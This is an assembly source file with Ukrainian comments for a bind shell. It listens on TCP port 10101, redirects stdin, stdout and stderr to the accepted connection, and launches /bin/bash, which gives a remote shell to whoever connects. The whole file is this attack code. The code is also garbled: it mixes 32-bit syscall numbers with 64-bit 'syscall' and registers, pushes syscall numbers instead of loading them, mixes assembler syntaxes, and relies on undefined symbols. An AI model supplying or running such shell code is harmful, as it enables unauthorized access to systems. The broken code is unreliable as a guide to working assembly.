; Оголошення секцій
.data
sock: .space 4  ; Дескриптор сокета
fd: .space 4    ; Дескриптор файлу
sin: .space 16  ; Структура sockaddr_in

; Оголошення констант
.equ AF_INET, 2
.equ PORT, 10101
.equ SYS_SOCKET, 102
.equ SYS_BIND, 100
.equ SYS_LISTEN, 103
.equ SYS_ACCEPT, 106
.equ SYS_DUP2, 93
.equ SYS_EXECVE, 11
.equ STDIN, 0
.equ STDOUT, 1
.equ STDERR, 2

.text
; Головна функція
main:
    ; Створення TCP-сокета
    push SYS_SOCKET
    mov eax, AF_INET
    mov ebx, SOCK_STREAM
    mov ecx, IPPROTO_TCP
    syscall

    ; Збереження дескриптора сокета
    mov [sock], eax

    ; Заповнення структури sockaddr_in
    movw AF_INET, [sin + sin_family]
    movw PORT, eax
    xchgb %ah, %al
    movw %ax, [sin + sin_port]

    ; Прив'язка сокета до адреси
    push SYS_BIND
    mov rdi, [sock]
    mov rsi, sin
    mov rdx, sizeof(sin)
    syscall

    ; Встановлення режиму прослуховування
    push SYS_LISTEN
    mov rdi, [sock]
    mov rsi, 1
    syscall

    ; Прийняття вхідного з'єднання
    push SYS_ACCEPT
    mov rdi, [sock]
    mov rsi, NULL
    mov rdx, NULL
    syscall

    ; Збереження дескриптора файлу
    mov [fd], eax

    ; Дублювання дескриптора файлу для stdin
    push SYS_DUP2
    mov rdi, [fd]
    mov rsi, STDIN
    syscall

    ; Дублювання дескриптора файлу для stdout
    push SYS_DUP2
    mov rdi, [fd]
    mov rsi, STDOUT
    syscall

    ; Дублювання дескриптора файлу для stderr
    push SYS_DUP2
    mov rdi, [fd]
    mov rsi, STDERR
    syscall

    ; Запуск /bin/bash
    mov rdi, bash
    xor rsi, rsi
    xor rdx, rdx
    push SYS_EXECVE
    syscall

    ; Вихід з програми
    mov eax, 60
    xor ebx, ebx
    int 80h

